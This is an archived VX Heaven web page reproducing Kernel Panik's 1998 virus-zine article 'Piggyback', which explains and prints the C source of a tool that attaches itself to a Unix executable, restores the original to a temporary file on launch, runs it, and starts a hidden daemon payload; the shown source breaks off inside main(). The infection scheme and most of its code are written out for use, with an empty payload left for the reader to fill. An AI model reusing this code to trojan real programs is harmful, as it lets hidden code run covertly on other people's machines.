<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> Kernel Panik 'Piggyback' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="Kernel Panik"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Kernel Panik,Piggyback, argv, path, long, fullname, piggyback, char, close, payload, file, fclose, copy, partial, victim, fork, fopen"/>
<meta name="Description" content="This is a small tool used to append executable code to an exiting program (virus writers would call it &quot;to infect&quot;). The idea used by piggyback is very simple and rather portable among different Unices. Piggyback itself is a small program in C that takes the place of the &quot;victim&quot;, which is copied after the piggyback code.  At the real end is stored a long which is the lenght of the piggyback executable."/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"3ea32de5b70e2129154fad2c5fc8ce8904ac0816-1498756956-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vkp00.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Piggyback</h1><p><a href="/lib/?lang=en&amp;author=Kernel%20Panik"> Kernel Panik</a><br/> <em><a href="/vx.php?fid=519#f519">Xine [4]</a></em><br/> <em>September 1998</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vkp00.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=UN#vkp00">Back to index</a>] [<a href="/lib/vkp00.html#disqus_thread">Comments</a>]<br/> 
<p>This is a small tool used to append executable code to an exiting program (virus writers would call it "to infect"). The idea used by piggyback is very simple and rather portable among different Unices. Piggyback itself is a small program in C that takes the place of the "victim", which is copied after the piggyback code. At the real end is stored a long which is the lenght of the piggyback executable. You can see how does the file look like once "infected" on this nice ascii picture:</p>
<pre>						          
       	       	     +---------+		          
		     |         |			  
		     |         |   	        	        
		     ~ N bytes ~       	Piggyback code	  
                     |         |		      	  
		     |         |		      	  
		     +---------+		      	  
		     |         |		      	  
		     |         |		      	  
		     ~ M bytes ~	Victim code   	  
		     |         |	    		  
		     |         |	    		  
		     +---------+	    		  
		     | 4 bytes |	    		  
		     | on 32   |	Piggyback len. = N
		     | bits    |	             
		     | arch.   |
		     +---------+
</pre>
<p>On execution the old file is copied to a temporany file and executed along with a payload code compiled in piggyback.</p>
<p>To use piggyback you just write the payload function and compile. If you don't want problems with shared libraries use the -static flag (under gcc). Then just do:</p>
<pre>./piggyback [name of executable to infect]</pre>
<p>Let's have a close look at the inner working of piggyback. We analyze each function in turn.</p>
<dl>
<dt>payload:</dt><dd>This is the payload code that you must write! :-)</dd>
<dt>find_fullname:</dt><dd>The argument argv[0] passed to main contains the name of the executable, but it's not standard among different Unices. So this functions tries to transform ts input to an usable path. It first check for an relative or absolute path (like "./run", "exe/run" or "/bin/run") or looks for the executable file in the directories listed in the PATH enviroment variable.</dd>
<dt>copy_file:</dt><dd>This helper function just copies data from the second stream to the first.</dd>
<dt>restore:</dt><dd>In this function the victim is restored to a temporany file.</dd>
</dl>
<p>The steps taken are:</p>
<ol>
<li>we ask for a temporany file.</li>
<li>look for the length of piggyback code.</li>
<li>skip it and copy the victim code to the temporany file.</li>
<li>take care of execution permission.</li>
</ol>
<dl>
<dt>piggyback:</dt><dd>Here we "infect" a given executable. We just mess with piggyback and victim code to achieve the structure presented in the picture.</dd>
<dt>main:</dt><dd>A big if clearly shows that there are 2 use of this function. If we are called as piggyback, we just look for a parameter containing the victim name and do our job. Otherwise we restore the victim and fork 2 processes:
<ol>
<li>One is the victim itself. Here we need anothe subprocess to clear the temporany file when the victim is done.</li>
<li>The payload, which is started as a daemon. Take a look at the Unix Programmes FAQ for an explanation of steps taken. The code before calling payload() assures that the payload won't be killed by HUP signals, won't block directories inodes, and closes it's standard descriptors. The double fork() is needed to prevent zombie processes.</li>
</ol></dd>
</dl>
<p>So, here it is. I hope you will find piggyback a useful tool!</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #808080; font-style: italic;">/* Piggyback by Kernel Panik <br/>
&nbsp; &nbsp;<br/>
&nbsp; &nbsp;Compile with:<br/>
&nbsp; &nbsp;cc piggyback.c -o piggyback<br/>
&nbsp; &nbsp;strip piggyback<br/>
<br/>
&nbsp; &nbsp;If you want a static executable just -static (for gcc).<br/>
*/</span><br/>
<br/>
<br/>
<span style="color: #339933;">#include &lt;unistd.h&gt;</span><br/>
<span style="color: #339933;">#include &lt;sys/types.h&gt;</span><br/>
<span style="color: #339933;">#include &lt;sys/stat.h&gt;</span><br/>
<span style="color: #339933;">#include &lt;fcntl.h&gt;</span><br/>
<span style="color: #339933;">#include &lt;sys/wait.h&gt;</span><br/>
<br/>
<span style="color: #339933;">#include &lt;string.h&gt;</span><br/>
<span style="color: #339933;">#include &lt;limits.h&gt;</span><br/>
<span style="color: #339933;">#include &lt;stdio.h&gt;</span><br/>
<span style="color: #339933;">#include &lt;stdlib.h&gt;</span><br/>
<span style="color: #339933;">#include &lt;errno.h&gt;</span><br/>
<br/>
<span style="color: #339933;">#define BUF_SIZE 30000</span><br/>
<br/>
<span style="color: #808080; font-style: italic;">/* payload tha is started with old executable */</span><br/>
<span style="color: #993333;">void</span> payload<span style="color: black;">&#40;</span><span style="color: #993333;">void</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
<span style="color: black;">&#125;</span><br/>
<br/>
<span style="color: #808080; font-style: italic;">/* this functions finds the fullname in from atgv[0], hopefully :-) */</span><br/>
<span style="color: #993333;">int</span> find_fullname<span style="color: black;">&#40;</span><span style="color: #993333;">char</span> <span style="color: #339933;">*</span>full<span style="color: #339933;">,</span><span style="color: #993333;">char</span> <span style="color: #339933;">*</span>partial<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/strchr.html"><span style="color: #000066;">strchr</span></a><span style="color: black;">&#40;</span>partial<span style="color: #339933;">,</span><span style="color: #ff0000;">'/'</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>partial<span style="color: black;">&#91;</span><span style="color: #0000dd;">0</span><span style="color: black;">&#93;</span><span style="color: #339933;">==</span><span style="color: #ff0000;">'/'</span><span style="color: black;">&#41;</span> <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/strcpy.html"><span style="color: #000066;">strcpy</span></a><span style="color: black;">&#40;</span>full<span style="color: #339933;">,</span><span style="color: #ff0000;">&quot;/&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: #b1b100;">else</span> <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/strcpy.html"><span style="color: #000066;">strcpy</span></a><span style="color: black;">&#40;</span>full<span style="color: #339933;">,</span><span style="color: #ff0000;">&quot;./&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/strcat.html"><span style="color: #000066;">strcat</span></a><span style="color: black;">&#40;</span>full<span style="color: #339933;">,</span>partial<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">1</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #b1b100;">else</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; <span style="color: #993333;">char</span> <span style="color: #339933;">*</span>next<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: #993333;">char</span> <span style="color: #339933;">*</span>path<span style="color: #339933;">=</span><a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/getenv.html"><span style="color: #000066;">getenv</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;PATH&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: #993333;">char</span> cp<span style="color: black;">&#91;</span>PATH_MAX<span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; FILE <span style="color: #339933;">*</span>f<span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; <span style="color: #b1b100;">do</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; next<span style="color: #339933;">=</span><a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/strchr.html"><span style="color: #000066;">strchr</span></a><span style="color: black;">&#40;</span>path<span style="color: #339933;">,</span><span style="color: #ff0000;">':'</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>next<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/strncpy.html"><span style="color: #000066;">strncpy</span></a><span style="color: black;">&#40;</span>cp<span style="color: #339933;">,</span>path<span style="color: #339933;">,</span>next<span style="color: #339933;">-</span>path<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; cp<span style="color: black;">&#91;</span>next<span style="color: #339933;">-</span>path<span style="color: black;">&#93;</span><span style="color: #339933;">=</span><span style="color: #ff0000;">'<span style="color: #006699; font-weight: bold;">\0</span>'</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; path<span style="color: #339933;">=</span>next<span style="color: #339933;">+</span><span style="color: #0000dd;">1</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/strcpy.html"><span style="color: #000066;">strcpy</span></a><span style="color: black;">&#40;</span>cp<span style="color: #339933;">,</span>path<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/strcat.html"><span style="color: #000066;">strcat</span></a><span style="color: black;">&#40;</span>cp<span style="color: #339933;">,</span><span style="color: #ff0000;">&quot;/&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/strcat.html"><span style="color: #000066;">strcat</span></a><span style="color: black;">&#40;</span>cp<span style="color: #339933;">,</span>partial<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>f<span style="color: #339933;">=</span><a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fopen.html"><span style="color: #000066;">fopen</span></a><span style="color: black;">&#40;</span>cp<span style="color: #339933;">,</span><span style="color: #ff0000;">&quot;r&quot;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fclose.html"><span style="color: #000066;">fclose</span></a><span style="color: black;">&#40;</span>f<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/strcpy.html"><span style="color: #000066;">strcpy</span></a><span style="color: black;">&#40;</span>full<span style="color: #339933;">,</span>cp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">1</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; <span style="color: black;">&#125;</span> <span style="color: #b1b100;">while</span> <span style="color: black;">&#40;</span>next<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
<br/>
<span style="color: #808080; font-style: italic;">/* a simple function that copies file i to file o */</span><br/>
<span style="color: #993333;">void</span> copy_file<span style="color: black;">&#40;</span>FILE <span style="color: #339933;">*</span>o<span style="color: #339933;">,</span> FILE <span style="color: #339933;">*</span>i<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #993333;">char</span> b<span style="color: black;">&#91;</span>BUF_SIZE<span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #993333;">int</span> l<span style="color: #339933;">;</span><br/>
<br/>
&nbsp; <span style="color: #b1b100;">while</span> <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>l<span style="color: #339933;">=</span><a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fread.html"><span style="color: #000066;">fread</span></a><span style="color: black;">&#40;</span>b<span style="color: #339933;">,</span><span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span>BUF_SIZE<span style="color: #339933;">,</span>i<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">&gt;</span><span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fwrite.html"><span style="color: #000066;">fwrite</span></a><span style="color: black;">&#40;</span>b<span style="color: #339933;">,</span><span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span>l<span style="color: #339933;">,</span>o<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: black;">&#125;</span><br/>
<span style="color: black;">&#125;</span><br/>
<br/>
<span style="color: #808080; font-style: italic;">/* here we restore the exec we are rideing to a temp file */</span><br/>
<span style="color: #993333;">int</span> restore<span style="color: black;">&#40;</span><span style="color: #993333;">char</span> <span style="color: #339933;">*</span>full<span style="color: #339933;">,</span> <span style="color: #993333;">char</span> <span style="color: #339933;">*</span>out<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; FILE <span style="color: #339933;">*</span>fin<span style="color: #339933;">,</span> <span style="color: #339933;">*</span>fout<span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #993333;">long</span> offset<span style="color: #339933;">;</span><br/>
<br/>
&nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/tmpnam.html"><span style="color: #000066;">tmpnam</span></a><span style="color: black;">&#40;</span>out<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; fout<span style="color: #339933;">=</span><a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fopen.html"><span style="color: #000066;">fopen</span></a><span style="color: black;">&#40;</span>out<span style="color: #339933;">,</span><span style="color: #ff0000;">&quot;w&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; fin<span style="color: #339933;">=</span><a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fopen.html"><span style="color: #000066;">fopen</span></a><span style="color: black;">&#40;</span>full<span style="color: #339933;">,</span><span style="color: #ff0000;">&quot;r&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fseek.html"><span style="color: #000066;">fseek</span></a><span style="color: black;">&#40;</span>fin<span style="color: #339933;">,-</span><span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span>SEEK_END<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fread.html"><span style="color: #000066;">fread</span></a><span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>offset<span style="color: #339933;">,</span><span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span><span style="color: #0000dd;">1</span><span style="color: #339933;">,</span>fin<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fseek.html"><span style="color: #000066;">fseek</span></a><span style="color: black;">&#40;</span>fin<span style="color: #339933;">,</span>offset<span style="color: #339933;">-</span><span style="color: #0000dd;">1</span><span style="color: #339933;">,</span>SEEK_SET<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; copy_file<span style="color: black;">&#40;</span>fout<span style="color: #339933;">,</span>fin<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fclose.html"><span style="color: #000066;">fclose</span></a><span style="color: black;">&#40;</span>fin<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fclose.html"><span style="color: #000066;">fclose</span></a><span style="color: black;">&#40;</span>fout<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; chmod<span style="color: black;">&#40;</span>out<span style="color: #339933;">,</span>S_IRUSR<span style="color: #339933;">|</span>S_IWUSR<span style="color: #339933;">|</span>S_IXUSR<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">1</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
<br/>
<span style="color: #808080; font-style: italic;">/* the real piggybacking code */</span><br/>
<span style="color: #993333;">int</span> piggyback<span style="color: black;">&#40;</span><span style="color: #993333;">char</span> <span style="color: #339933;">*</span>fn<span style="color: #339933;">,</span> <span style="color: #993333;">char</span> <span style="color: #339933;">*</span>me<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #993333;">char</span> tmp<span style="color: black;">&#91;</span>PATH_MAX<span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
&nbsp; FILE <span style="color: #339933;">*</span>ffn<span style="color: #339933;">,</span> <span style="color: #339933;">*</span>ftmp<span style="color: #339933;">,</span> <span style="color: #339933;">*</span>fme<span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #993333;">long</span> len<span style="color: #339933;">;</span><br/>
<br/>
&nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/tmpnam.html"><span style="color: #000066;">tmpnam</span></a><span style="color: black;">&#40;</span>tmp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <br/>
&nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #339933;">!</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>ftmp<span style="color: #339933;">=</span><a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fopen.html"><span style="color: #000066;">fopen</span></a><span style="color: black;">&#40;</span>tmp<span style="color: #339933;">,</span><span style="color: #ff0000;">&quot;w&quot;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">&amp;&amp;</span> <span style="color: black;">&#40;</span>ffn<span style="color: #339933;">=</span><a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fopen.html"><span style="color: #000066;">fopen</span></a><span style="color: black;">&#40;</span>fn<span style="color: #339933;">,</span><span style="color: #ff0000;">&quot;r&quot;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">1</span><span style="color: #339933;">;</span><br/>
&nbsp; copy_file<span style="color: black;">&#40;</span>ftmp<span style="color: #339933;">,</span>ffn<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fclose.html"><span style="color: #000066;">fclose</span></a><span style="color: black;">&#40;</span>ftmp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fclose.html"><span style="color: #000066;">fclose</span></a><span style="color: black;">&#40;</span>ffn<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #339933;">!</span><span style="color: black;">&#40;</span>ffn<span style="color: #339933;">=</span><a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fopen.html"><span style="color: #000066;">fopen</span></a><span style="color: black;">&#40;</span>fn<span style="color: #339933;">,</span><span style="color: #ff0000;">&quot;w&quot;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/remove.html"><span style="color: #000066;">remove</span></a><span style="color: black;">&#40;</span>tmp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">2</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; ftmp<span style="color: #339933;">=</span><a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fopen.html"><span style="color: #000066;">fopen</span></a><span style="color: black;">&#40;</span>tmp<span style="color: #339933;">,</span><span style="color: #ff0000;">&quot;r&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; fme<span style="color: #339933;">=</span><a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fopen.html"><span style="color: #000066;">fopen</span></a><span style="color: black;">&#40;</span>me<span style="color: #339933;">,</span><span style="color: #ff0000;">&quot;r&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; copy_file<span style="color: black;">&#40;</span>ffn<span style="color: #339933;">,</span>fme<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; copy_file<span style="color: black;">&#40;</span>ffn<span style="color: #339933;">,</span>ftmp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; len<span style="color: #339933;">=</span><a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/ftell.html"><span style="color: #000066;">ftell</span></a><span style="color: black;">&#40;</span>fme<span style="color: black;">&#41;</span><span style="color: #339933;">+</span><span style="color: #0000dd;">1</span><span style="color: #339933;">;</span><br/>
&nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fwrite.html"><span style="color: #000066;">fwrite</span></a><span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>len<span style="color: #339933;">,</span><span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span><span style="color: #0000dd;">1</span><span style="color: #339933;">,</span>ffn<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fclose.html"><span style="color: #000066;">fclose</span></a><span style="color: black;">&#40;</span>ffn<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fclose.html"><span style="color: #000066;">fclose</span></a><span style="color: black;">&#40;</span>fme<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fclose.html"><span style="color: #000066;">fclose</span></a><span style="color: black;">&#40;</span>ftmp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/remove.html"><span style="color: #000066;">remove</span></a><span style="color: black;">&#40;</span>tmp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
<br/>
<span style="color: #993333;">int</span> main <span style="color: black;">&#40;</span><span style="color: #993333;">int</span> argc<span style="color: #339933;">,</span> <span style="color: #993333;">char</span> <span style="color: #339933;">*</span>argv<span style="color: black;">&#91;</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
<br/>
&nbsp; <span style="color: #993333;">char</span> fullname<span style="color: black;">&#91;</span>PATH_MAX<span style="color: black;">&#93;</span><span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* our full name */</span><br/>
&nbsp; <span style="color: #993333;">char</span> outname<span style="color: black;">&#91;</span>PATH_MAX<span style="color: black;">&#93;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* program to be started */</span><br/>
&nbsp; <span style="color: #993333;">char</span> <span style="color: #339933;">**</span>newarg<span style="color: #339933;">,</span> <span style="color: #339933;">*</span>name<span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #993333;">int</span> fd<span style="color: #339933;">,</span>i<span style="color: #339933;">,</span>status<span style="color: #339933;">;</span><br/>
<br/>
